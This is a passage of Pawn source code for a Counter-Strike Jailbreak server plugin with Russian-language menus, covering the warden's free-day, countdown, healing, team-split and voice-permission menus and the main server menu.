                return HAM_SUPERCEDE
        return HAM_IGNORED
}
	
stock box_auto_off()
{
	g_BoxStarted = false
					
	for(new i = 1; i <= get_maxplayers(); i++)
	{
		if(!is_user_alive(i))
			continue
												
		if(get_user_team(i) == 1)
		{
			set_user_health(i, 100)
						
			if(equal(g_BoxWeapon, "Диглы"))
			{
				cs_set_user_bpammo(i, CSW_DEAGLE, 0)							
			}
			else if(equal(g_BoxWeapon, "Дробовики"))
			{								
				cs_set_user_bpammo(i, CSW_M3, 0)								
			}
			else if(equal(g_BoxWeapon, "Скаут"))
			{
				cs_set_user_bpammo(i, CSW_SCOUT, 0)							
			}
			else if(equal(g_BoxWeapon, "Гранаты"))
			{							
				cs_set_user_bpammo(i, CSW_HEGRENADE, 0)
			}							
						
			player_strip_weapons(i)
			engclient_cmd(i, "weapon_knife")		
		}
					
	}
}

public VoiceCmdMenu(id)
{
	if(!is_user_alive(id) || get_user_team(id) != 2)
		return PLUGIN_HANDLED

	if(id != g_Simon)
		return PLUGIN_HANDLED

	static menu[256], iLen
	iLen = 0
	
	iLen = formatex(menu[iLen], charsmax(menu) - iLen, "\yЗвуки:^n")
	
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r1\y] \wГонг^n^n\dОбратный отсчёт:^n")
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r2\y] \w10 секунд^n")
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r3\y] \w5 секунд^n")
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r4\y] \w3 секунды^n^n")

	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r0\y] Выход")

	show_menu(id, keysmenu, menu, -1, "VoiceMenu")
	return PLUGIN_HANDLED
}

public simon_voice_cmd(id, key)
{	
	if(id != g_Simon)
		return PLUGIN_HANDLED

	switch(key)
	{
		case 0:
		{
			client_cmd(0, "spk UJB/gong.wav")
		}
		case 1:
		{
			if (task_exists(41170))
				remove_task(41170)
				
			g_Seconds = 11
			set_task(1.0,"count_timer",41170,_,_,"b")		
		}
		case 2:
		{
			if (task_exists(41170))
				remove_task(41170)
				
			g_Seconds = 6
			set_task(1.0,"count_timer",41170,_,_,"b")		
		}
		case 3:
		{
			if (task_exists(41170))
				remove_task(41170)
				
			g_Seconds = 4
			set_task(1.0,"count_timer",41170,_,_,"b")		
		}
	}
	return PLUGIN_HANDLED
}

public count_timer()
{
   if (--g_Seconds > 0)
   {
      if (g_Seconds>= 0)
      {
	client_print(0, print_center, "Обратный отсчёт: %d сек",g_Seconds)	
      }
      switch(g_Seconds)
      {  
         case 0: remove_task(41170)
         case 1: client_cmd(0, "spk UJB/Timer/1.wav")
         case 2: client_cmd(0, "spk UJB/Timer/2.wav")
         case 3: client_cmd(0, "spk UJB/Timer/3.wav")
         case 4: client_cmd(0, "spk UJB/Timer/4.wav")
         case 5: client_cmd(0, "spk UJB/Timer/5.wav")
         case 6: client_cmd(0, "spk UJB/Timer/6.wav")
         case 7: client_cmd(0, "spk UJB/Timer/7.wav")
         case 8: client_cmd(0, "spk UJB/Timer/8.wav")
         case 9: client_cmd(0, "spk UJB/Timer/9.wav")
         case 10: client_cmd(0, "spk UJB/Timer/10.wav")
      }
   }
}
	
public cmd_freeday(id)
{
	if(!is_user_alive(id) || get_user_team(id) != 2)
		return PLUGIN_HANDLED

	if(id != g_Simon)
		return PLUGIN_HANDLED

	static menu[256], iLen
	iLen = 0
	
	iLen = formatex(menu[iLen], charsmax(menu) - iLen, "\yКому даем Свободный День?^n")
	
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r1\y] \wВыбранному заключенному^n")
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r2\y] \wСвободный День всем^n^n")
	
	if(iFreeDay > 0)
	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r3\y] \wЗабрать Свободный День^n")

	iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\y[\r0\y] Выход")

	show_menu(id, keysmenu, menu, -1, "FreedayMenu")
	return PLUGIN_HANDLED
}

public freeday_choice(id, key)
{	
	if(id != g_Simon)
		return PLUGIN_HANDLED

	switch(key)
	{
		case 0: freeday_give_player(id)
		case 1:
		{
			if(CountTLive <= 0)
			{
				ChatColor(id, "%s !yЗаключенные не найдены", Prefix)
				return PLUGIN_HANDLED
			}
			
			new name[32]
			get_user_name(g_Simon, name, 31)
			jb_set_model(g_Simon, GuardUJB)
			
			for(new i = 1; i <= get_maxplayers(); i++)
			{
				if(get_user_team(i) == 1 && is_user_alive(i) && !get_bit(g_PlayerWanted, i))
				{
					remove_task(id + TASK_FD_ONE)
					entity_set_int(i, EV_INT_skin, 5)
				}
			}
			iFreeDay = 0
			g_PlayerFreeday = 0
			g_Simon = 0
			g_Fdall = true
			g_Fdalltime = 180
			set_task(1.1, "timer_all_fd")
			client_cmd(0, "spk UJB/gong.wav")
			ChatColor(0, "%s !yСаймон: !t%s !yвыдал всем зекам !gСвободный День", Prefix, name)
		}
		case 2: {
			if(iFreeDay > 0)
				freeday_ungive_player(id)
			else ChatColor(id, "%s !yЗаключенные со !gСвободным Днем !yне найдены!", Prefix)
		}
	}
	return PLUGIN_HANDLED
}

public timer_all_fd()
{
	if(g_Fdalltime > 0 && g_Fdall)
	{
	g_Fdalltime--
	set_task(1.1, "timer_all_fd")
	}
	return PLUGIN_HANDLED
}

public freeday_give_player(id)
{   
	if(CountTLive <= 0)
	{
		ChatColor(id, "%s !yЗаключенные не найдены", Prefix)
		return PLUGIN_HANDLED
	}
	if(iFreeDay >= 6)
	{
		ChatColor(id, "!g[!tЗащита!g] !yМест нет, ждите пока закончится ФД у одного из зеков.")
		return PLUGIN_HANDLED
	}
	
	new i_Menu = menu_create("\wКому даём Свободный День?", "menu_fd_give_pl")
	new s_Players[32], i_Num, i_Player, msg[222]
	new s_Name[32], s_Player[10]
	get_players(s_Players, i_Num, "a")
	for (new i; i < i_Num; i++)
   	{ 
		i_Player = s_Players[i]
		get_user_name(i_Player, s_Name, charsmax(s_Name))
		num_to_str(i_Player, s_Player, charsmax(s_Player))
		if(is_user_alive(i_Player) && id != i_Player && get_user_team(i_Player) == 1 && !get_bit(g_PlayerFreeday, i_Player))
		{
			formatex(msg, charsmax(msg), "\w%s", s_Name) 
			menu_additem(i_Menu, msg, s_Player, 0)
		}
		else if(get_bit(g_PlayerFreeday, i_Player))
		{
			formatex(msg, charsmax(msg), "\w%s \d[\yСвободный\d]", s_Name) 
			menu_additem(i_Menu, msg, s_Player, 0)
		}
		menu_setprop(i_Menu, MPROP_NEXTNAME, "Далее")
		menu_setprop(i_Menu, MPROP_BACKNAME, "Назад")
		menu_setprop(i_Menu, MPROP_EXITNAME, "Выход")
    }
	menu_display(id, i_Menu, 0)
	return PLUGIN_HANDLED
}
 
public menu_fd_give_pl(id, menu, item)
{
	if (item == MENU_EXIT || g_Simon != id)
    {
           menu_destroy(menu)
           return PLUGIN_HANDLED
    }

	new s_Data[6], s_Name[64], i_Access, i_Callback
	menu_item_getinfo(menu, item, i_Access, s_Data, charsmax(s_Data), s_Name, charsmax(s_Name), i_Callback)
	new i_Player = str_to_num(s_Data) 
	new name2[32]
	get_user_name(i_Player, name2, 31)

	if(!is_user_connected(i_Player))
	{
		ChatColor(id, "%s  !yЭтот игрок вышел с сервера :(", Prefix)   	
	}
	else if(!is_user_alive(i_Player))
    	{
		cmd_simonmenu(id)
		ChatColor(id, "%s  !yЭтот игрок мёртв, зачем ему Свободный день?", Prefix)	
   	}
	else if(get_user_team(i_Player) != 1)
	{
		cmd_simonmenu(id)
		ChatColor(id, "%s  !yЭтот игрок вышел из роли Заключенного", Prefix) 
	}
	else 
    	{
	if(get_bit(g_PlayerFreeday, i_Player))
		ChatColor(0, "%s !yСаймон продлил !gСвободный День !yзеку: !g%s", Prefix, name2)
	else
		ChatColor(0, "%s !yСаймон выдал !gСвободный День !yзеку: !g%s", Prefix, name2)

	freeday_set(i_Player)
	cmd_simonmenu(id)
    	}

	menu_destroy(menu)
	return PLUGIN_HANDLED
}


public freeday_ungive_player(id)
{   
	if(CountTLive <= 0)
	{
		ChatColor(id, "%s !yЗаключенные не найдены", Prefix)
		return PLUGIN_HANDLED
	}
	
	new i_Menu = menu_create("\wУ кого забрать Свободу?", "menu_fd_ungive_pl")
	new s_Players[32], i_Num, i_Player, msg[222]
	new s_Name[32], s_Player[10]
	get_players(s_Players, i_Num, "a")
	for (new i; i < i_Num; i++)
   	{ 
		i_Player = s_Players[i]
		get_user_name(i_Player, s_Name, charsmax(s_Name))
		num_to_str(i_Player, s_Player, charsmax(s_Player))
		if(is_user_alive(i_Player) && id != i_Player && get_user_team(i_Player) == 1 && get_bit(g_PlayerFreeday, i_Player))
		{
			formatex(msg, charsmax(msg), "\w%s \d[\y%d\w сек\d]", s_Name, szPlayerFDTime[i_Player])
			menu_additem(i_Menu, msg, s_Player, 0)
		}
		menu_setprop(i_Menu, MPROP_NEXTNAME, "Далее")
		menu_setprop(i_Menu, MPROP_BACKNAME, "Назад")
		menu_setprop(i_Menu, MPROP_EXITNAME, "Выход")
    }
	menu_display(id, i_Menu, 0)
	return PLUGIN_HANDLED
}
 
public menu_fd_ungive_pl(id, menu, item)
{
	if (item == MENU_EXIT || g_Simon != id)
    {
           menu_destroy(menu)
           return PLUGIN_HANDLED
    }

	new s_Data[6], s_Name[64], i_Access, i_Callback
	menu_item_getinfo(menu, item, i_Access, s_Data, charsmax(s_Data), s_Name, charsmax(s_Name), i_Callback)
	new i_Player = str_to_num(s_Data) 
	new name2[32]
	get_user_name(i_Player, name2, 31)

	if(!is_user_connected(i_Player))
	{
		cmd_simonmenu(id)
		ChatColor(id, "%s  !yЭтот игрок вышел с сервера :(", Prefix)   	
	}
	else if(!is_user_alive(i_Player))
    {
		cmd_simonmenu(id)
		ChatColor(id, "%s  !yЭтот игрок мёртв", Prefix)	
   	}
	else if(get_user_team(i_Player) != 1)
	{
		cmd_simonmenu(id)
		ChatColor(id, "%s  !yЭтот игрок вышел из роли Заключенного", Prefix) 
	}
	else if(!get_bit(g_PlayerFreeday, i_Player))
	{
		cmd_simonmenu(id)
		ChatColor(id, "%s  !yУ этого игрока нет !gСвободного Дня", Prefix)
	}
	else if(is_user_alive(i_Player) && get_user_team(i_Player) == 1 && get_bit(g_PlayerFreeday, i_Player))
	{
			if(jb_get_svip_model(i_Player))
				jb_set_model(i_Player, SuperVIP)
			else
			{
				jb_set_model(i_Player, ZekUJB)
				entity_set_int(i_Player, EV_INT_skin, random_num(0, 3))
			}
			
			szPlayerFDTime[i_Player] = 0
			iFreeDay--
			szTimeFD[i_Player][0] = 0
			
			if(task_exists(i_Player + TASK_FD_ONE))
			remove_task(i_Player + TASK_FD_ONE)
			clear_bit(g_PlayerFreeday, i_Player)	

			ChatColor(0, "%s !yСаймон забрал !gСвободный День !yу зека: !g%s", Prefix, name2)
    }
	
	menu_destroy(menu)
	return PLUGIN_HANDLED
}

public RemoveFromWanted(id)
{
	if(CountTLive < 1)
	{
		ChatColor(id, "%s !yЗаключенные не найдены", Prefix)
		return PLUGIN_HANDLED
	}
	new i_Menu = menu_create("\yКого убрать из списка?", "remove_wanted_handler")
	new s_Players[32], i_Num, i_Player
	new s_Name[32], s_Player[10]
	
	get_players(s_Players, i_Num)
	
	for (new i; i < i_Num; i++)
	{ 
		i_Player = s_Players[i]
	
		if(is_user_alive(i_Player) && id != i_Player && get_user_team(i_Player) == 1 && get_bit(g_PlayerWanted, i_Player))
		{
			get_user_name(i_Player, s_Name, charsmax(s_Name))
			num_to_str(i_Player, s_Player, charsmax(s_Player))

			menu_additem(i_Menu, s_Name, s_Player, 0)
		}
	}
	menu_display(id, i_Menu, 0)
	return PLUGIN_HANDLED
}

public remove_wanted_handler(id, i_Menu, item)
{
	if(item == MENU_EXIT || g_Simon != id)
	{
		menu_destroy(i_Menu)
		return PLUGIN_HANDLED
	}

	new s_Data[6], s_Name[64], i_Access, i_Callback
	menu_item_getinfo(i_Menu, item, i_Access, s_Data, charsmax(s_Data), s_Name, charsmax(s_Name), i_Callback)

	new i_Player = str_to_num(s_Data)

	new name[32], name_player[32]
	get_user_name(id, name, charsmax(name))
	get_user_name(i_Player, name_player, charsmax(name_player))

	if(g_Simon == id && id != i_Player && is_user_alive(i_Player) && get_user_team(i_Player) == 1 && get_bit(g_PlayerWanted, i_Player))
	{
		ChatColor(0, "%s !yСаймон: !g%s !yпощадил заключенного: !g%s", Prefix, name, name_player)
		clear_bit(g_PlayerWanted, i_Player)
		g_WantedNum--
		entity_set_int(i_Player, EV_INT_skin, random_num(0, 3))
	}

	menu_destroy(i_Menu)
	return PLUGIN_HANDLED
}	
	
public CurePrisoners(id)
{
	if(CountTLive < 1)
	{
		ChatColor(id, "%s !yЗаключенные не найдены", Prefix)
		return PLUGIN_HANDLED
	}
	new Buffer[512]
	formatex(Buffer, charsmax(Buffer), "\yКого вылечить?")
	new i_Menu = menu_create(Buffer, "cure_handler")

	new s_Players[32], i_Num, i_Player
	new s_Name[32], s_Player[10]
	
	get_players(s_Players, i_Num)
	
	for (new i; i < i_Num; i++)
	{ 
		i_Player = s_Players[i]
	
		if(is_user_alive(i_Player) && id != i_Player && get_user_team(i_Player) == 1 && get_user_health(i_Player) < 100)
		{
			get_user_name(i_Player, s_Name, charsmax(s_Name))
			num_to_str(i_Player, s_Player, charsmax(s_Player))
			
			formatex(Buffer, charsmax(Buffer), "%s \r[ ХП: %d ]", s_Name, get_user_health(i_Player))
			menu_additem(i_Menu, Buffer, s_Player, 0)
		}
	}
	menu_display(id, i_Menu, 0)
	return PLUGIN_HANDLED
}

public cure_handler(id, i_Menu, item)
{
	if(item == MENU_EXIT || g_Simon != id)
	{
		menu_destroy(i_Menu)
		return PLUGIN_HANDLED
	}

	new s_Data[6], s_Name[64], i_Access, i_Callback
	menu_item_getinfo(i_Menu, item, i_Access, s_Data, charsmax(s_Data), s_Name, charsmax(s_Name), i_Callback)

	new i_Player = str_to_num(s_Data)

	new name[32], name_player[32]
	get_user_name(id, name, charsmax(name))
	get_user_name(i_Player, name_player, charsmax(name_player))

	if(g_Simon == id && id != i_Player && is_user_alive(i_Player) && get_user_team(i_Player) == 1 && get_user_health(i_Player) < 100)
	{
		ChatColor(0, "%s !yСаймон !t%s !yвылечил заключенного !t%s", Prefix, name, name_player)
		set_user_health(i_Player, 100)
	}

	menu_destroy(i_Menu)
	return PLUGIN_HANDLED
}

public CheckWeapon(id)
{
	if(g_Simon != id)
		return

	if(ChekWeaponAmount[id] < 1)
	{
		ChatColor(id, "%s !yВы истратили свой лимит проверок.", Prefix)
		return
	}

	new vic, bd
	get_user_aiming(id, vic, bd, 200)

	if(is_user_alive(vic))
	{
		new iBitWeapons = pev(vic, pev_weapons) + (1<<31)

		if(iBitWeapons &= ~(1<<CSW_HEGRENADE | 1<<CSW_SMOKEGRENADE | 1<<CSW_FLASHBANG | 1<<CSW_KNIFE))
			ChatColor(id, "%s !yУ заключенного !tЕСТЬ !yоружие", Prefix)
		else
			ChatColor(id, "%s !yУ заключенного !tнет !yоружия", Prefix)

		ChekWeaponAmount[id]--

	}
}


public simon_player(id)
{
	if(g_Simon == id)
	{
		new Buffer[64]
		formatex(Buffer, charsmax(Buffer), "Кому передать полномочия?")

		new i_Menu = menu_create(Buffer, "simonplayer")
		new s_Players[32], i_Num, i_Player
		new s_Name[32], s_Player[10]
	
		get_players(s_Players, i_Num)
	
		for (new i; i < i_Num; i++)
		{ 
			i_Player = s_Players[i]
	
			if(is_user_alive(i_Player) && id != i_Player && get_user_team(i_Player) == 2)
			{
				get_user_name(i_Player, s_Name, charsmax(s_Name))
				num_to_str(i_Player, s_Player, charsmax(s_Player))
				menu_additem(i_Menu, s_Name, s_Player, 0)
			}
		}
		menu_display(id, i_Menu, 0)
		return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}
     
public simonplayer(id, menu, item)
{
	if(item == MENU_EXIT)
	{
		menu_destroy(menu)
		return PLUGIN_HANDLED
	}

	new s_Data[6], s_Name[64], i_Access, i_Callback
	menu_item_getinfo(menu, item, i_Access, s_Data, charsmax(s_Data), s_Name, charsmax(s_Name), i_Callback)

	new i_Player = str_to_num(s_Data)

	new name[32], name_player[32]
	get_user_name(id, name, charsmax(name))
	get_user_name(i_Player, name_player, charsmax(name_player))
	
	if(g_Simon == id && id != i_Player && is_user_alive(i_Player) && get_user_team(i_Player) == 2)
	{
		g_Simon = 0
		ChatColor(0, "%s !yНачальник: !g%s !yпередал свои полномочия Охраннику: !g%s", Prefix, name, name_player)
		cmd_simon(i_Player)
		jb_set_model(id, GuardUJB)
	}

	menu_destroy(menu)
	return PLUGIN_HANDLED
}
 
public GivePickVoice(id)
{
        if(id == g_Simon || get_user_flags(id) & ADMIN_LEVEL_B || get_user_flags(id) & ADMIN_BAN){

        new szTitle[512]
        new szItem[512]
 
        formatex(szTitle, charsmax( szTitle ), "Выберите игрока:")
        new szMenu = menu_create(szTitle, "GolosMenu_handler")
 
        new szPlayers[32]
        new szPlayer, szNum
        new szName[32], szPlayerNum[10]
 
        get_players(szPlayers, szNum)
 
        for(new i; i < szNum; i++)
        {
                szPlayer = szPlayers[i]
 
                if(!is_user_connected(szPlayer) || get_user_team(szPlayer) != 1 || !is_user_alive(szPlayer))
                        continue
 
                get_user_name(szPlayer, szName, charsmax( szName ))
                num_to_str(szPlayer, szPlayerNum, charsmax( szPlayerNum ))
 
                if(!get_bit(g_PlayerVoice, szPlayer))
                {
                        formatex(szItem, charsmax( szItem ), "%s \d[ \yДать \d]", szName)
                        menu_additem(szMenu, szItem, szPlayerNum, 0)
                }else{
                        formatex(szItem, charsmax( szItem ), "%s \d[ \rЗабрать \d]", szName)
                        menu_additem(szMenu, szItem, szPlayerNum, 0)
                }
        }
       
        
	menu_setprop(szMenu, MPROP_NEXTNAME, "Далее")
	menu_setprop(szMenu, MPROP_BACKNAME, "Назад")
	menu_setprop(szMenu, MPROP_EXITNAME, "Выйти")
	menu_setprop(szMenu, MPROP_EXIT, MEXIT_ALL )
	menu_display(id, szMenu, 0)
	return PLUGIN_HANDLED
		
	}
 
        return PLUGIN_HANDLED
}
 
public GolosMenu_handler(id, szMenu, szItem)
{
        if(szItem == MENU_EXIT)
        {
                menu_destroy( szMenu )
                return PLUGIN_HANDLED
        }
 
        new szData[6], szName[64], szAccess, szCallback
        menu_item_getinfo(szMenu, szItem, szAccess, szData, charsmax( szData ), szName, charsmax( szName ), szCallback)
 
        new szPlayer = str_to_num( szData )
 
        new szNameSimon[32], szNamePlayer[32]
        get_user_name(id, szNameSimon, charsmax( szNameSimon ))
        get_user_name(szPlayer, szNamePlayer, charsmax( szNamePlayer ))
 
        if(id != szPlayer && get_user_team(szPlayer) == 1)
        {
			if(get_bit(g_PlayerVoice, szPlayer))
			{
				clear_bit(g_PlayerVoice, szPlayer)
				ChatColor(0, "%s !g%s !yзабрал голос у зека !g%s", Prefix, szNameSimon, szNamePlayer)
			}else{
				set_bit(g_PlayerVoice, szPlayer)
				ChatColor(0, "%s !g%s !yдал голос зеку !g%s", Prefix, szNameSimon, szNamePlayer)
			}
        }
 
        menu_destroy( szMenu )
        return PLUGIN_HANDLED
}


public MenuTeam(id)
{
	if(!is_user_alive(id) || id != g_Simon )
		return PLUGIN_HANDLED

	/*if(g_GameMode == 0)
	{
		ChatColor(0, "%s !yВо время !gСвободного дня !yна команды делить невозможно.", Prefix)
		return PLUGIN_HANDLED
	}
	*/
	new Buffer[512]
	formatex(Buffer, charsmax(Buffer), "\yДеление заключенных на команды:")
	new menu = menu_create(Buffer, "t_skin")

	formatex(Buffer, charsmax(Buffer), "\wПоделить на 2 команды")
	menu_additem(menu, Buffer, "1")

	formatex(Buffer, charsmax(Buffer), "\wПоделить на 3 команды")
	menu_additem(menu, Buffer, "2")

	formatex(Buffer, charsmax(Buffer), "\wПоделить на 4 команды^n")
	menu_additem(menu, Buffer, "3")

	formatex(Buffer, charsmax(Buffer), "\wСлучайное деление")
	menu_additem(menu, Buffer, "4")

	formatex(Buffer, charsmax(Buffer), "Выход")
	menu_setprop(menu, MPROP_EXITNAME, Buffer)
    
	menu_display(id, menu, 0)
	return PLUGIN_HANDLED
}

public t_skin(id, menu, item)
{
	if(item == MENU_EXIT || !is_user_alive(id) || id != g_Simon)
	{
		menu_destroy(menu)
		return PLUGIN_HANDLED
	}
   
	new data[6], iName[64], access, callback
	menu_item_getinfo(menu, item, access, data, 5, iName, 63, callback)
  
	new key = str_to_num(data)
  
	switch(key) 
	{
		case 1: DivideTeams(id, 2)
		case 2: DivideTeams(id, 3)
		case 3: DivideTeams(id, 4)
		case 4:
		{
			for(new i = 1; i <= get_maxplayers(); i++) 
			{
				if(is_user_alive(i) && get_user_team(i) == 1 && !get_bit(g_PlayerFreeday, i) && !get_bit(g_PlayerWanted, i))
				{
					entity_set_int(i, EV_INT_skin, random_num(0, 3))
				}
			}
		}
	}
	return PLUGIN_HANDLED
}

//======================================================================
//= [Меню саймона] Алгоритм деления
//======================================================================
public DivideTeams(index, iTeams)
{
	if(index != g_Simon) return;

	new iCurTeam = 0;

	for(new i = 1; i <= get_maxplayers(); i++) 
	{
		if(!is_user_alive(i) || get_user_team(i) != 1 || get_bit(g_PlayerFreeday, i) || get_bit(g_PlayerWanted, i))
			continue;

		switch (iCurTeam++ % iTeams)
		{
			case 0: entity_set_int(i, EV_INT_skin, 0)
			case 1: entity_set_int(i, EV_INT_skin, 1)
			case 2: entity_set_int(i, EV_INT_skin, 2)
			case 3: entity_set_int(i, EV_INT_skin, 3)
		}
	}
}
 

 
// Меню сервера
public servmenu(id)
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED
		
	static menu[512], ilen
	ilen = 0
		
	ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\dМеню сервера:^n^n")
               
	if(get_user_team(id) == 1)
	{
		if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
		{
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wОткрыть клетки^n")
			keys |= MENU_KEY_1
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r2\y] \wМагазин^n^n")
			keys |= MENU_KEY_2
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r3\y] \wЖелание последнего зека^n")
			keys |= MENU_KEY_3
							
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r4\y] \wПеревести деньги^n")
			keys |= MENU_KEY_4
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r5\y] \wВыбор команды^n^n")
			keys |= MENU_KEY_5	
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wКак купить Админку?^n")
			keys |= MENU_KEY_6
			
			if(g_Fdall)
			{
				if(get_user_flags(id) & ADMIN_LEVEL_B)
				{
				ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r7\y] \wСупер VIP Меню^n")
				keys |= MENU_KEY_7
				}
				
				if(get_user_flags(id) & ADMIN_LEVEL_C)
				{
				ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r7\y] \wVIP Меню^n")
				keys |= MENU_KEY_7
				}
			}
		}
		else
		{
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wМагазин^n^n")
			keys |= MENU_KEY_1
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r2\y] \wЖелание последнего зека^n")
			keys |= MENU_KEY_2

			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r3\y] \wПеревести деньги^n")
			keys |= MENU_KEY_3

			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r4\y] \wВыбор команды^n^n")
			keys |= MENU_KEY_4
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r5\y] \wКак купить Админку?^n")
			keys |= MENU_KEY_5
			
			if(get_user_flags(id) & ADMIN_LEVEL_B)
			{
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wСупер VIP Меню^n")
			keys |= MENU_KEY_6
			}
			
			if(get_user_flags(id) & ADMIN_LEVEL_C)
			{
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wVIP Меню^n")
			keys |= MENU_KEY_6
			}
		}
	}
	else if(get_user_team(id) == 2)
	{
		if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
		{
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wОткрыть клетки^n")
			keys |= MENU_KEY_1
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r2\y] \wМагазин^n^n")
			keys |= MENU_KEY_2
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r3\y] \wПеревести деньги^n")
			keys |= MENU_KEY_3
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r4\y] \wВыбор команды^n^n")
			keys |= MENU_KEY_4	
			
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r5\y] \wКак купить Админку?^n")
			keys |= MENU_KEY_5
			
			if(g_Fdall)
			{
				if(get_user_flags(id) & ADMIN_LEVEL_B)
				{
				ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wСупер VIP Меню^n")
				keys |= MENU_KEY_6
				}
				if(get_user_flags(id) & ADMIN_LEVEL_C)
				{
				ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wVIP Меню^n")
				keys |= MENU_KEY_6
				}
			}
		}
		else
		{
			if(g_Simon <= 0)
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wВзять Саймона^n^n")
			else if(g_Simon == id)
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wМеню Саймона^n^n")
			else if(g_Simon > 0 && g_Simon != id)
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wМагазин^n^n")
			keys |= MENU_KEY_1
			
			if(g_Simon == id || g_Simon == 0)
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r2\y] \wМагазин^n")
			else 
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r2\y] \wПеревести деньги^n")
			keys |= MENU_KEY_2

			if(g_Simon == id || g_Simon == 0)
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r3\y] \wПеревести деньги^n")
			else
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r3\y] \wВыбор команды^n")
			keys |= MENU_KEY_3

			if(g_Simon == id || g_Simon == 0)
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r4\y] \wВыбор команды^n^n")
			else
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r4\y] \wКак купить Админку?^n^n")
			keys |= MENU_KEY_4
			
			if(g_Simon == id || g_Simon == 0){
			ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r5\y] \wКак купить Админку?^n")
			keys |= MENU_KEY_5
			}
			else
			{
				if(get_user_flags(id) & ADMIN_LEVEL_B)
				{
					ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r5\y] \wСупер VIP Меню^n")
					keys |= MENU_KEY_5
				}
				if(get_user_flags(id) & ADMIN_LEVEL_C)
				{
					ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r5\y] \wVIP Меню^n")
					keys |= MENU_KEY_5
				}
			}
			
			if(g_Simon == id || g_Simon == 0)
			{
				if(get_user_flags(id) & ADMIN_LEVEL_B)
				{
					ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wСупер VIP Меню^n")
					keys |= MENU_KEY_6
				}
				if(get_user_flags(id) & ADMIN_LEVEL_C)
				{
					ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r6\y] \wVIP Меню^n")
					keys |= MENU_KEY_6
				}
			}
						
		}
	}
	else if(get_user_team(id) != 1 && get_user_team(id) != 2)
	{
		ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r1\y] \wВыбор команды^n^n")
		keys |= MENU_KEY_1
			
		ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r2\y] \wКак купить Админку?^n")
		keys |= MENU_KEY_2

		ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r3\y] \wКак купить Сборку сервера?^n")
		keys |= MENU_KEY_3	
	} 
	 
	ilen += formatex(menu[ilen], charsmax(menu) - ilen, "\y[\r0\y] \wВыход^n^n\rМы ВКонтакте:^n\y%s", vkontakte)	
		
	show_menu(id, keys, menu, -1, "MenuServa")
	return PLUGIN_HANDLED		
}				

public menu_serva_handled(id, key)
{                 
	new name[32]
	get_user_name(id, name, 31)
	
	if(get_user_team(id) == 1)
	{	   
        switch(key)
        {
			case 0:
			{
				if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
				client_cmd(id, "say /open")
				else {
				client_cmd(id, "say /shop")
				}
			}
			case 1: 
			{
					if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
					client_cmd(id, "say /shop")
					else
					client_cmd(id, "say /lr")
			}
			case 2: 
			{
				if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
				client_cmd(id, "say /lr")
				else
				client_cmd(id, "say /transfer")
				
			}
			case 3: 
			{
					if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
					client_cmd(id, "say /transfer")
					else
					team_menu(id)
			}
			case 4: 
			{
					if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
					team_menu(id)
